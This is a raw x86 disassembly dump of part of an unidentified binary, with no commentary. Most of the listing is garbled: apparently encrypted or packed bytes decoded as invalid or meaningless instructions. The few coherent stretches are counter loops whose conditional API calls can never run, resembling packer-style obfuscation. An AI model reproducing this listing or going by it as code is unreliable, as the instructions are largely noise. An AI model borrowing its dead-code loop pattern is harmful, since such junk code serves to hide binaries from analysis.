  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	lds    edi,FWORD PTR [edi-0x67]
  40eda2:	fs popa 
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	call   eax
  40edad:	inc    eax
  40edae:	sbb    eax,0x11592e96
  40edb3:	data16 mov dh,0xe0
  40edb6:	sub    al,0xbd
  40edb8:	fcom   st(7)
  40edba:	stos   BYTE PTR es:[edi],al
  40edbb:	xchg   esi,eax
  40edbc:	pop    ebp
  40edbd:	xlat   BYTE PTR ds:[ebx]
  40edbe:	and    eax,0x5aeb5938
  40edc3:	(bad)  
  40edc4:	sub    al,0x73
  40edc6:	jp     0x40ee00
  40edc8:	imul   esp
  40edca:	sti    
  40edcb:	sub    bh,ch
  40edcd:	sbb    eax,0x30f91c78
  40edd2:	lods   eax,DWORD PTR ds:[esi]
  40edd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd4:	shl    BYTE PTR ds:0xe00f6aa0,1
  40edda:	pop    edi
  40eddb:	inc    eax
  40eddc:	jmp    0xe495:0x1a794864
  40ede3:	stos   DWORD PTR es:[edi],eax
  40ede4:	mov    ebp,0x2b6371f5
  40ede9:	inc    edi
  40edea:	in     al,dx
  40edeb:	outs   dx,DWORD PTR ds:[esi]
  40edec:	jge    0x40ee19
  40edee:	xor    eax,DWORD PTR [ebx+edi*4]
  40edf1:	mov    eax,0x4684fc29
  40edf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edf7:	aad    0xed
  40edf9:	and    BYTE PTR [eax-0x44c08604],bh
  40edff:	es sbb al,0xea
  40ee02:	inc    ebp
  40ee03:	sbb    BYTE PTR [ecx],al
  40ee05:	xor    DWORD PTR [edx],0x5
  40ee08:	push   es
  40ee09:	jmp    0x40ee1c
  40ee0b:	xor    esi,esp
  40ee0d:	mov    DWORD PTR [eax],edx
  40ee0f:	push   eax
  40ee10:	fst    DWORD PTR [edx+0x4c]
  40ee13:	dec    esi
  40ee14:	out    dx,al
  40ee15:	dec    BYTE PTR [ebx]
  40ee17:	xchg   ebp,eax
  40ee18:	aad    0xdd
  40ee1a:	push   ecx
  40ee1b:	cdq    
  40ee1c:	jmp    0xb696:0x4fe45cc
  40ee23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee24:	xor    edx,0xae76dd35
  40ee2a:	retf   
  40ee2b:	jne    0x40ee78
  40ee2d:	cmp    esp,DWORD PTR [edi-0x12]
  40ee30:	jg     0x40ee77
  40ee32:	push   edx
  40ee33:	sbb    BYTE PTR [esi-0x16],al
  40ee36:	mov    bl,0x71
  40ee38:	dec    ecx
  40ee39:	sbb    al,0x92
  40ee3b:	mov    ah,0xc9
  40ee3d:	inc    eax
  40ee3e:	inc    ecx
  40ee3f:	or     BYTE PTR [esp+edi*1-0x30f70553],dh
  40ee46:	push   es
  40ee47:	and    eax,0xe73357c8
  40ee4c:	mov    ds:0x8978a58f,eax
  40ee51:	(bad)  
  40ee52:	outs   dx,BYTE PTR ds:[esi]
  40ee53:	push   0x52fcbbb0
  40ee58:	rcr    ch,0xc4
  40ee5b:	mov    dh,al
  40ee5d:	mov    esp,0xf27de5ab
  40ee62:	adc    bl,BYTE PTR [edi]
  40ee64:	jnp    0x40ee9a
  40ee66:	pop    es
  40ee67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee68:	xor    eax,0xfb6d3220
  40ee6d:	pop    ds
  40ee6e:	das    
  40ee6f:	call   0xa593ad5f
  40ee74:	mov    WORD PTR [eax+eiz*8+0xbdb8e2e],ss
  40ee7b:	pop    edx
  40ee7c:	jmp    FWORD PTR [edx]
  40ee7e:	jnp    0x40eebd
  40ee80:	mov    ebp,0xf4b88ba8
  40ee85:	sub    al,0xba
  40ee87:	mov    WORD PTR [eax+0x422d0478],?
  40ee8d:	add    eax,0xb282c96d
  40ee92:	iret   
  40ee93:	outs   dx,DWORD PTR ds:[esi]
  40ee94:	or     eax,0x6d282fb9
  40ee99:	adc    edx,edi
  40ee9b:	(bad)  
  40ee9c:	jns    0x40ef03
  40ee9e:	ins    DWORD PTR es:[edi],dx
  40ee9f:	inc    ebp
  40eea0:	call   0x12a3196
  40eea5:	sbb    eax,0x3c2ff968
  40eeaa:	loope  0x40ef17
  40eeac:	ret    
  40eead:	adc    al,0xa6
  40eeaf:	cwde   
  40eeb0:	sub    al,0x38
  40eeb2:	test   eax,0x798254f6
  40eeb7:	mov    ebx,0x3bf9a040
  40eebc:	push   0x28
  40eebe:	or     eax,0xbc7d522b
  40eec3:	push   edx
  40eec4:	mov    cl,0x8a
  40eec6:	fnsave [eax]
  40eec8:	shl    ah,cl
  40eeca:	cwde   
  40eecb:	out    0x11,al
  40eecd:	jp     0x40eeec
  40eecf:	pop    esi
  40eed0:	dec    ebp
  40eed1:	sub    dh,0x63
  40eed4:	mov    eax,0x6255fabb
  40eed9:	scas   eax,DWORD PTR es:[edi]
  40eeda:	aas    
  40eedb:	popa   
  40eedc:	popf   
  40eedd:	mov    ecx,0x347c550b
  40eee2:	mov    WORD PTR [eax+ecx*2+0x30],?
  40eee6:	pop    esi
  40eee7:	and    ah,BYTE PTR [ebp+edx*2+0x0]
  40eeeb:	pop    ecx
  40eeec:	xor    esi,DWORD PTR [ecx]
  40eeee:	imul   esp,edx,0x36
  40eef1:	push   0xffffffe3
  40eef3:	rol    BYTE PTR [edx-0x53],1
  40eef6:	mov    eax,ds:0xa2ccecb3
  40eefb:	mov    BYTE PTR [ebp+0x228bb8f4],0xea
  40ef02:	mov    dh,0x62
  40ef04:	adc    DWORD PTR [esi+eiz*8+0x2cfc3859],esp
  40ef0b:	es out 0xa5,eax
  40ef0e:	dec    ebx
  40ef0f:	js     0x40eecf
  40ef11:	rol    BYTE PTR [esi+edi*8],cl
  40ef14:	iret   
  40ef15:	rcr    BYTE PTR [edi+0x61],1
  40ef18:	inc    eax
  40ef19:	add    DWORD PTR [ebx+0xd36aed4],esp
  40ef1f:	lods   al,BYTE PTR ds:[esi]
  40ef20:	out    dx,al
  40ef21:	jae    0x40eed9
  40ef23:	push   ds
  40ef24:	hlt    
  40ef25:	mov    esi,0xf84b8a8b
  40ef2a:	and    cl,cl
  40ef2c:	sub    eax,0x8c6b3c8d
  40ef31:	sbb    dh,ch
  40ef33:	fs repnz xchg esi,eax
  40ef36:	(bad)  
  40ef39:	xor    al,0x7a
  40ef3b:	nop
  40ef3c:	(bad)  
  40ef3d:	and    dl,al
  40ef3f:	adc    ecx,0xfffffff4
  40ef42:	sbb    al,0x93
  40ef44:	in     eax,0x5a
  40ef46:	xchg   esi,eax
  40ef47:	pop    ebp
  40ef48:	rol    eax,cl
  40ef4a:	adc    al,0x67
  40ef4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef4d:	mov    edi,0xd5a8e0b7
  40ef52:	fcomp  st(1)
  40ef54:	inc    edx
  40ef55:	sbb    eax,0x37100cc4
  40ef5a:	aas    
  40ef5b:	arpl   WORD PTR [eax+ebp*4+0x28],bp
  40ef5f:	dec    di
  40ef61:	ret    0x559c
  40ef64:	jl     0x40efaf
  40ef66:	xchg   ebp,eax
  40ef67:	hlt    
  40ef68:	out    0xfb,eax
  40ef6a:	ficom  DWORD PTR [ebp+0x1b]
  40ef6d:	inc    eax
  40ef6e:	pushf  
  40ef6f:	mov    dl,0xc
  40ef71:	jmp    0x7bc91a85
  40ef76:	or     ebx,DWORD PTR [eax]
  40ef78:	pusha  
  40ef79:	and    al,0x94
  40ef7b:	(bad)  
  40ef7c:	lods   eax,DWORD PTR ds:[esi]
  40ef7d:	xchg   ebp,eax
  40ef7e:	xor    DWORD PTR [ebp+0x17e1fdb4],ecx
  40ef84:	inc    edi
  40ef85:	xor    BYTE PTR [edi+0x73],dl
  40ef88:	and    eax,0xc051cc8f
  40ef8d:	sub    DWORD PTR [edi],0x8cbd461
  40ef93:	(bad)  
  40ef94:	push   esp
  40ef95:	push   edi
  40ef96:	jnp    0x40efc8
  40ef98:	jmp    0x5319:0x3004d722
  40ef9f:	jb     0x40effa
  40efa1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40efa3:	ret    0x16ab
  40efa6:	xor    edx,DWORD PTR [ebx]
  40efa8:	daa    
  40efa9:	ror    BYTE PTR [ebp-0x692a3217],0x49
  40efb0:	push   eax
  40efb1:	xchg   edx,eax
  40efb2:	cmp    esi,edi
  40efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb5:	and    esp,ecx
  40efb7:	cli    
  40efb8:	xor    BYTE PTR [edx+0x4f],dh
  40efbb:	ja     0x40efd0
  40efbd:	bound  ebx,QWORD PTR [ecx+0x14]
  40efc0:	in     eax,0x66
  40efc2:	shl    DWORD PTR [edx*8+0x7cb4a84d],1
  40efc9:	(bad)  
  40efca:	int3   
  40efcb:	retf   0xe00b
  40efce:	imul   esi,DWORD PTR [edx-0x4b],0x68886531
  40efd5:	pop    ecx
  40efd6:	repnz xchg ecx,eax
  40efd8:	mov    esp,0x999ae545
  40efdd:	mov    ecx,0xea54dbc9
  40efe2:	push   esi
  40efe3:	dec    ebp
  40efe4:	int    0x5d
  40efe6:	call   0x9d2877f5
  40efeb:	sub    al,0x8
  40efed:	pop    edx
  40efee:	jmp    0x40ef81
  40eff0:	int    0x29
  40eff2:	outs   dx,BYTE PTR ds:[esi]
  40eff3:	das    
  40eff4:	rcr    BYTE PTR [edi],1
  40eff6:	and    BYTE PTR [ebx-0x27],0x20
  40effa:	popf   
  40effb:	leave  
  40effc:	(bad)  
  40effe:	icebp  
  40efff:	sahf   
  40f000:	xor    eax,0xcbb4153f
  40f005:	pextrw esp,(bad),0xc5
  40f007:	and    eax,0x350a30e3
  40f00c:	pop    ss
  40f00d:	ret    0x3906
  40f010:	mov    ecx,0x2e967528
  40f015:	arpl   WORD PTR [ecx+0x2581f855],cx
  40f01b:	add    DWORD PTR [eax+0x42],ebp
  40f021:	add    BYTE PTR [eax],al
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xaf
  40f0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d8:	shl    ecx,0xce
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	fadd   DWORD PTR [ecx+0x2c6d65b6]
  40f0e8:	xor    BYTE PTR [edx+0x6e],dl
  40f0eb:	cmp    DWORD PTR [eax-0x7b],esp
  40f0ee:	mov    esi,0x45976099
  40f0f3:	cmp    BYTE PTR [eax+0x4f],ch
  40f0f6:	xchg   edi,eax
  40f0f7:	lods   al,BYTE PTR ds:[esi]
  40f0f8:	and    BYTE PTR [ebp+0x21],0x56
  40f0fc:	xchg   esi,eax
  40f0fd:	xchg   DWORD PTR [ecx-0x2f0f646a],ebx
  40f103:	adc    BYTE PTR [eax-0x1d2629de],bh
  40f109:	dec    eax
  40f10a:	je     0x40f12c
  40f10c:	clc    
  40f10d:	pop    eax
  40f10e:	sbb    ch,BYTE PTR [eax+0x7c]
  40f111:	idiv   BYTE PTR [esi]
  40f113:	es lahf 
  40f115:	sub    ecx,DWORD PTR es:[bp+di-0x1]
  40f11a:	icebp  
  40f11b:	mov    ?,WORD PTR [edi]
  40f11d:	jae    0x40f14c
  40f11f:	out    dx,eax
  40f120:	sub    BYTE PTR [di-0x5051],ah
  40f125:	push   cs
  40f126:	push   cs
  40f127:	push   ecx
  40f128:	mov    edi,0xef899527
  40f12d:	out    0x44,eax
  40f12f:	test   eax,0xf089b0f3
  40f134:	mov    ebp,0x767e8ca2
  40f139:	fwait
  40f13a:	outs   dx,BYTE PTR ds:[esi]
  40f13b:	jmp    0x52cd:0x5eb1a8d4
  40f142:	or     BYTE PTR [ebp+0x2a7e5008],cl
  40f148:	lock ror DWORD PTR [ecx+0x2bba54d9],1
  40f14f:	repz and DWORD PTR [ebp+0x7ac911dd],edi
  40f156:	xchg   DWORD PTR [edi],edx
  40f158:	sbb    BYTE PTR [esi-0x1a4ffc2d],dl
  40f15e:	jge    0x40f11a
  40f160:	jnp    0x40f10e
  40f162:	sub    DWORD PTR [edi+0x39],eax
  40f165:	add    al,0xf4
  40f167:	in     al,dx
  40f168:	or     ecx,edx
  40f16a:	xchg   edx,eax
  40f16b:	mov    BYTE PTR [ecx-0xa9f1c8c],0x82
  40f172:	mov    edx,0x31c85e51
  40f177:	dec    esp
  40f178:	mov    gs,WORD PTR [eax+0x3faa48d5]
  40f17e:	pop    ebp
  40f17f:	dec    ecx
  40f180:	xor    esi,ebx
  40f182:	lahf   
  40f183:	xor    ch,al
  40f185:	jecxz  0x40f173
  40f187:	loopne 0x40f1d8
  40f189:	or     DWORD PTR [edi-0x1b],edx
  40f18c:	jmp    0x79e5d714
  40f191:	mov    ah,0x9c
  40f193:	jle    0x40f1c9
  40f195:	dec    edx
  40f196:	dec    eax
  40f197:	push   ebx
  40f198:	and    dh,BYTE PTR [ecx+0x4dc92fc9]
  40f19e:	and    bl,bl
  40f1a0:	inc    ecx
  40f1a1:	jl     0x40f12c
  40f1a3:	call   0x64e8:0x31560752
  40f1aa:	and    al,0xec
  40f1ac:	xchg   cl,bl
  40f1ae:	add    al,0xc2
  40f1b0:	ffree  st(2)
  40f1b2:	lahf   
  40f1b3:	rcl    BYTE PTR [eax],cl
  40f1b5:	push   eax
  40f1b6:	xchg   ebp,eax
  40f1b7:	jmp    0x40f13d
  40f1b9:	xor    ebp,DWORD PTR [eax]
  40f1bb:	sub    eax,0xf1ff6eae
  40f1c0:	push   ebp
  40f1c1:	dec    DWORD PTR [edx-0x65b37a7]
  40f1c7:	mov    esp,0x69a9e49b
  40f1cc:	sti    
  40f1cd:	fadd   st,st(1)
  40f1cf:	ret    
  40f1d0:	xchg   edx,eax
  40f1d1:	test   BYTE PTR [edi],ah
  40f1d3:	xor    edx,edi
  40f1d5:	outs   dx,DWORD PTR ds:[esi]
  40f1d6:	in     eax,dx
  40f1d7:	sti    
  40f1d8:	stos   BYTE PTR es:[edi],al
  40f1d9:	xor    ebx,eax
  40f1db:	jg     0x40f1a6
  40f1dd:	(bad)  
  40f1de:	stos   BYTE PTR es:[edi],al
  40f1df:	ss pop es
  40f1e1:	pop    edx
  40f1e2:	sub    dl,ah
  40f1e4:	mov    edi,0x663dfb9d
  40f1e9:	sub    dh,BYTE PTR [ebp+0x73]
  40f1ec:	add    al,dl
  40f1ee:	test   al,0xf3
  40f1f0:	adc    DWORD PTR [edx],ebx
  40f1f2:	inc    edi
  40f1f3:	scas   eax,DWORD PTR es:[edi]
  40f1f4:	adc    ebx,DWORD PTR [ebp-0x4f]
  40f1f7:	aad    0x7f
  40f1f9:	push   0x9ea67970
  40f1fe:	lock loop 0x40f1bf
  40f201:	inc    ecx
  40f202:	bnd jg 0x40f1ee
  40f205:	mov    ds:0x1a0599f3,eax
  40f20a:	mov    al,ds:0xb6ea28b7
  40f20f:	ror    BYTE PTR [edi],1
  40f211:	ret    0x3bc4
  40f214:	pop    ecx
  40f215:	jns    0x40f287
  40f217:	mov    es,WORD PTR [ebp+ebx*1-0x2bbdae50]
  40f21e:	sub    eax,0xcab2ab7a
  40f223:	dec    esp
  40f224:	(bad)  
  40f226:	inc    edx
  40f227:	push   ecx
  40f228:	xchg   ebp,eax
  40f229:	dec    ebp
  40f22a:	fidivr DWORD PTR [ebx+0x12]
  40f22d:	push   es
  40f22e:	jb     0x40f1f9
  40f230:	sub    edi,DWORD PTR [edx+esi*2]
  40f233:	and    dh,BYTE PTR [esi-0x75e55df3]
  40f239:	ins    DWORD PTR es:[edi],dx
  40f23a:	out    dx,al
  40f23b:	cmp    eax,0x108a9fe2
  40f240:	clc    
  40f241:	call   0xe94e:0x9f7ef6aa
  40f248:	and    BYTE PTR [ebx+0x1e],cl
  40f24b:	dec    ebx
  40f24c:	dec    edx
  40f24d:	xchg   ecx,eax
  40f24e:	push   edx
  40f24f:	inc    esp
  40f250:	leave  
  40f251:	scas   al,BYTE PTR es:[edi]
  40f252:	add    esp,DWORD PTR [ebx]
  40f254:	retf   
  40f255:	push   es
  40f256:	mov    ebx,0xbfa6d827
  40f25b:	enter  0x656d,0xbf
  40f25f:	sbb    dl,bl
  40f261:	je     0x40f24d
  40f263:	inc    eax
  40f264:	add    eax,0xe8e199fe
  40f269:	push   edi
  40f26a:	add    esi,edx
  40f26c:	add    ecx,DWORD PTR [ecx+0x4e]
  40f26f:	nop
  40f270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f271:	add    eax,0x59595e9f
  40f276:	adc    DWORD PTR ds:0x9977e20a,ebp
  40f27c:	sbb    ah,BYTE PTR fs:[ebp+0x44a91d]
  40f283:	hlt    
  40f284:	pop    ecx
  40f285:	cmp    DWORD PTR [edi+ebx*8+0x6df6b629],esp
  40f28c:	cwde   
  40f28d:	imul   esi,esp,0xde156760
  40f293:	(bad)  
  40f294:	cmp    cl,BYTE PTR ds:0x33474412
  40f29a:	mov    ecx,0x5f04d638
  40f29f:	jns    0x40f23b
  40f2a1:	mov    bh,0x47
  40f2a3:	enter  0xeb35,0x85
  40f2a7:	lods   al,BYTE PTR ds:[esi]
  40f2a8:	sub    esi,ecx
  40f2aa:	inc    esi
  40f2ab:	outs   dx,DWORD PTR ds:[esi]
  40f2ac:	add    dh,BYTE PTR ds:0xa697c421
  40f2b2:	xchg   ebp,eax
  40f2b3:	inc    edi
  40f2b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b5:	mov    edx,0x8841aa2b
  40f2ba:	pusha  
  40f2bb:	not    BYTE PTR [esp+ecx*1]
  40f2be:	push   ebp
  40f2bf:	and    al,0x4
  40f2c1:	jl     0x40f288
  40f2c3:	leave  
  40f2c4:	clc    
  40f2c5:	inc    ebx
  40f2c6:	icebp  
  40f2c7:	fadd   st,st(1)
  40f2c9:	mov    esp,0xe063098b
  40f2ce:	ds jns 0x40f2ca
  40f2d1:	mov    ds:0xdf89417a,eax
  40f2d6:	je     0x40f27d
  40f2d8:	dec    ebx
  40f2d9:	not    DWORD PTR [esi]
  40f2db:	sbb    eax,0x5ecbcbf9
  40f2e0:	or     al,dh
  40f2e2:	je     0x40f347
  40f2e4:	xlat   BYTE PTR ds:[ebx]
  40f2e5:	lea    esi,[ebx-0x18]
  40f2e8:	push   edi
  40f2e9:	mov    bl,ch
  40f2eb:	es or  al,0xbd
  40f2ee:	cmp    al,0x12
  40f2f0:	and    esi,DWORD PTR [edi]
  40f2f2:	stos   BYTE PTR es:[edi],al
  40f2f3:	fisub  DWORD PTR [esp+edi*2]
  40f2f6:	test   al,0x48
  40f2f8:	ret    0x9e23
  40f2fb:	push   edi
  40f2fc:	dec    DWORD PTR [edi-0x116ca8bc]
  40f302:	call   0x8c6:0x5412cac3
  40f309:	push   ebx
  40f30a:	mov    ebp,0x72e596c1
  40f30f:	mov    edi,0xe91aabae
  40f314:	jl     0x40f2b8
  40f316:	lahf   
  40f317:	xchg   edi,eax
  40f318:	nop
  40f319:	mov    ch,0xd3
  40f31b:	push   esp
  40f31c:	out    dx,al
  40f31d:	pop    ecx
  40f31e:	lds    ebx,FWORD PTR [edi]
  40f320:	add    DWORD PTR [ebp+0x502ffe2d],ecx
  40f326:	mov    dl,0xe8
  40f328:	mov    ebp,ds
  40f32a:	xchg   ecx,eax
  40f32b:	dec    esi
  40f32c:	mov    dl,0xf0
  40f32e:	inc    ecx
  40f32f:	push   ds
  40f330:	pop    edi
  40f331:	dec    edi
  40f332:	push   es
  40f333:	int    0x8b
  40f335:	push   ebp
  40f336:	imul   ebp,DWORD PTR [eax+0x76420946],0xac279c1d
  40f340:	ror    cl,1
  40f342:	adc    ah,BYTE PTR [edi]
  40f344:	clc    
  40f345:	aas    
  40f346:	ja     0x40f390
  40f348:	js     0x40f333
  40f34a:	cmp    BYTE PTR [eax+0x40],dh
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a80d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a80d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shr    DWORD PTR [ebp-0x44133300],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	sbb    eax,0x15a971f
  40f582:	pop    ds
  40f583:	dec    esp
  40f584:	add    bl,BYTE PTR [ecx]
  40f586:	xchg   ebp,eax
  40f587:	jmp    0x90814d0b
  40f58c:	icebp  
  40f58d:	ins    DWORD PTR es:[edi],dx
  40f58e:	std    
  40f58f:	or     al,BYTE PTR [esi-0xf603b31]
  40f595:	mov    dl,0x9c
  40f597:	int    0x50
  40f599:	sub    al,0xdd
  40f59b:	(bad)  
  40f59c:	cmc    
  40f59d:	add    ah,BYTE PTR [ecx]
  40f59f:	fst    DWORD PTR [edx-0x51795992]
  40f5a5:	cmp    DWORD PTR [eax-0x46],esi
  40f5a8:	shr    BYTE PTR [eax],cl
  40f5aa:	or     BYTE PTR [ebp+0x3e],dh
  40f5ad:	outs   dx,BYTE PTR ds:[esi]
  40f5ae:	outs   dx,DWORD PTR ds:[esi]
  40f5af:	fst    DWORD PTR [eax]
  40f5b1:	xor    eax,0xd793afec
  40f5b6:	xchg   esi,eax
  40f5b7:	push   ecx
  40f5b8:	aaa    
  40f5b9:	sbb    al,BYTE PTR [esi-0x42]
  40f5bc:	inc    ebx
  40f5bd:	cmp    al,0xc6
  40f5bf:	je     0x40f584
  40f5c1:	xor    dl,0xc1
  40f5c4:	and    edx,DWORD PTR [edi-0x266309cf]
  40f5ca:	ja     0x40f606
  40f5cc:	das    
  40f5cd:	inc    ebp
  40f5ce:	stc    
  40f5cf:	cwde   
  40f5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5d1:	pop    ebp
  40f5d2:	and    DWORD PTR [esi],edi
  40f5d4:	pop    esi
  40f5d5:	pop    esp
  40f5d6:	pop    ecx
  40f5d7:	(bad)  
  40f5d8:	xchg   ebp,eax
  40f5d9:	bound  esp,QWORD PTR [edx-0x1e]
  40f5dc:	data16 xor al,0x64
  40f5df:	mov    eax,ds:0x1965645
  40f5e4:	icebp  
  40f5e5:	jp     0x40f612
  40f5e7:	add    al,0xb6
  40f5e9:	inc    ecx
  40f5ea:	push   ss
  40f5eb:	add    DWORD PTR [esi+0x37],0x30907edb
  40f5f2:	hlt    
  40f5f3:	jbe    0x40f662
  40f5f5:	hlt    
  40f5f6:	xchg   edx,eax
  40f5f7:	in     al,0x9c
  40f5f9:	xchg   ebx,eax
  40f5fa:	jl     0x40f638
  40f5fc:	shl    bl,1
  40f5fe:	daa    
  40f5ff:	cwde   
  40f600:	inc    esi
  40f601:	out    0xf3,eax
  40f603:	dec    ebx
  40f604:	outs   dx,BYTE PTR ds:[esi]
  40f605:	xor    ah,ah
  40f607:	sbb    al,0x20
  40f609:	xchg   edx,eax
  40f60a:	xchg   ebx,eax
  40f60b:	nop
  40f60c:	mov    al,ds:0x3278a562
  40f611:	test   DWORD PTR [esi+0x769a9633],eax
  40f617:	pop    ds
  40f618:	pop    ds
  40f619:	ret    0x15ca
  40f61c:	mov    dh,0xcb
  40f61e:	call   0xb14a24c
  40f623:	mov    eax,ds:0x23fb2041
  40f628:	sbb    esi,DWORD PTR [edx+0x1a]
  40f62b:	sub    al,0x15
  40f62d:	loopne 0x40f5c9
  40f62f:	mov    bh,0x8e
  40f631:	outs   dx,DWORD PTR ds:[esi]
  40f632:	jbe    0x40f63a
